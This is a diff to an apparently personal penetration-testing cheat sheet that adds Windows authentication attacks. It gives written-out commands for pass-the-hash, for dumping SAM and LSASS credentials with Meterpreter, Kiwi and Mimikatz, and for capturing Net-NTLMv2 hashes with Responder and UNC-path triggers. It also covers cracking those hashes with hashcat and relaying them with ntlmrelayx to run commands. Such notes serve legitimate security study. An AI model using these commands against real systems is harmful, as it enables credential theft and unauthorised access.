@@ -513,9 +513,20 @@ migrate 2948
 
 ---
 
-## Pass the Hash
+## Authentication Attacks
 
-Pass-the-Hash is a technique where you authenticate as a user without knowing the plaintext password. Instead, you can use the NTLM hash of the password to gain access to systems and resources.
+### Pass the Hash
+
+Pass-the-Hash is a technique where you authenticate as a user without knowing the plaintext password. Instead, you can use the NTLM hash of the password to gain access to systems and resources. This attack works with network protocols that use NTLM authentication, such as **SMB**, **RDP**, and **WinRM**.
+
+{{< hint style=notes >}}
+**UAC Remote Restrictions**
+
+By default, User Account Control (UAC) prevents local administrator accounts from performing remote administration tasks.
+
+* Bypass: The built-in **Administrator** account (SID ending in -500) is immune to this restriction.
+* Blocked: Any other user in the Administrators group will have their token filtered, and the hash-passing will fail unless UAC remote restrictions are disabled on the target.
+{{< /hint >}}
 
 
 ```sh
@@ -526,7 +537,11 @@ crackmapexec smb <ip> -u <administrator> -H <NTLM hash> -x "ipconfig"
 impacket-psexec -hashes <LM hash>:<NTLM hash> Administrator@<ip>
 
 # 3. Method (Metasploit) -> windows/smb/psexec
-set SMBPass <LM hash>:<NTLM hash>
+msf > use exploit/windows/smb/psexec
+msf > set RHOSTS <ip>
+msf > set SMBUser Administrator
+msf > set SMBPass <LM hash>:<NTLM hash>
+msf > run
 ```
 
 {{< hint style=notes >}}
@@ -536,6 +551,147 @@ set SMBPass <LM hash>:<NTLM hash>
   * `AAD3B435B51404EEAAD3B435B51404EE:<NTLM>`
 * With `hashdump` you have the right format
 {{< /hint >}}
+
+---
+
+### Dumping Credentials from Memory & SAM
+
+{{< hint style=warning >}}
+**Prerequisites**: User must be a member a local Administrators.
+{{< /hint >}}
+
+**(1) hashdump (Metasploit - Meterpreter)**
+
+```sh
+# You may need to migrate meterpreter to NT AUTHORITY\SYSTEM process
+meterpreter > getpid
+meterpreter > ps # Find a SYSTEM process like lsass.exe or winlogon.exe
+meterpreter > migrate <PID>
+
+# Dump the hashes
+meterpreter > hashdump
+```
+
+**(2) Kiwi (Metasploit - Meterpreter)**
+
+```sh
+# Ensure you are running as SYSTEM
+meterpreter > getuid
+meterpreter > getsystem # if needed
+
+# Load the kiwi extension
+meterpreter > load kiwi
+
+# Retrieve all available credentials (plaintext, hashes, tickets, etc.)
+meterpreter > creds_all
+
+# Dump NTLM hashes for all of the user accounts on the system
+meterpreter > lsa_dump_sam
+
+# Dump plaintext passwords and other secrets from memory (LSASS)
+lsa_dump_secrets
+# Note: from the Windows version 8.0+, windows don’t store any plain text password.
+# So, it can be helpful for the older version of the Windows.
+```
+
+**(3) Mimikatz**
+
+The most powerful credential-dumping tool.
+
+1. **Upload and execute** `mimikatz.exe` on the target machine
+
+2. **Enable Debug Privileges**. This should be a standard for running mimikatz as it `SeDebugPrivilege` access right enabled to run command such as `sekurlsa::logonpasswords` and `lsadump::sam`.
+
+```dos
+mimikatz # privilege::debug
+Privilege '20' OK
+```
+
+This should return **Privilege '20' OK**.
+
+3. **Extract Logon Passwords**. This command parses the LSASS process memory for credentials of logged-on users.
+```dos
+sekurlsa::logonpasswords
+```
+
+4. **Dump NTLM hashes** from the SAM. You must first run `token::elevate` to elevate to `SYSTEM` user privileges.
+```dos
+mimikatz # token::elevate
+mimikatz # lsadump::sam
+```
+
+---
+
+### Abuse the Net-NTLMv2
+
+If you cannot dump hashes directly, you can capture a **Net-NTLMv2** hash. This is a challenge-response hash used for network authentication and is more secure than NTLMv1. Unlike an NTLM hash, it cannot be used for Pass-the-Hash but can be cracked offline or relayed.
+
+1. **Set up a fake SMB/HTTP server** using **[Responder](https://github.com/lgandx/Responder)** or similar tool.
+
+```sh
+# sudo responder -I <your_network_interface> -v
+sudo responder -I tap0 -v
+```
+
+2. **Trigger Authentication**. Force a Windows machine to authenticate to your listener.
+ 
+* **From a Shell**: If you have command execution, request a resource from your attacker machine's fake share.
+
+```sh
+dir \\<your_ip>\share
+```
+
+* **From a Web App**: If there's a feature that processes UNC paths (e.g., file upload, avatar from URL), provide a path to your listener.
+
+```sh
+\\<your_ip>\share\nonexistent.pdf
+```
+
+
+3. **Capture the Hash**: Responder will capture the challenge-response exchange. The hash will look something like this:
+
+```sh
+[SMB] NTLMv2-SSP Hash Captured: user::domain:challenge:response_hash
+```
+
+4. **Crack the Hash**: Use a tool like Hashcat with mode 5600 to crack the captured hash offline.
+
+```sh
+hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
+```
+
+---
+
+### Relaying Net-NTLMv2
+
+This technique is used when you have captured a user's Net-NTLMv2 hash but cannot crack it. The core idea is to forward this hash to another machine for authentication, hoping the user has administrative privileges on that target machine.
+
+{{< hint style=warning >}}
+**Requirement**: The success of this attack against a user who is not the default local Administrator depends on UAC Remote Restrictions being disabled on the target machine.
+{{< /hint >}}
+
+1. **Setup (on Attacker Machine)**: Use `impacket-ntlmrelayx` to listen for a connection and relay it to the target, executing a command upon success.
+
+```sh
+impacket-ntlmrelayx -t [Target_2_IP] -c "[Command_to_Execute]" -smb2support
+```
+
+2. Trigger (on Source Machine: TARGET_1)
+
+```sh
+ls \\<your_ip>\share
+```
+
+3. Relay (by Attacker Machine)
+
+The `ntlmrelayx` tool intercepts the authentication attempt from TARGET_1. It does not authenticate it. Instead, it forwards (relays) the hash to the specified target, TARGET_2.
+
+4. Execution (on Target Machine: TARGET_2)
+
+TARGET_2 receives the relayed authentication request and validates the TARGET_2_admin hash. 
+
+**IF** TARGET_2_admin is a local administrator **AND** UAC remote restrictions are disabled, the authentication succeeds. TARGET_2 then executes the payload supplied by `ntlmrelayx` in Step 1.
+
 
 ---
 
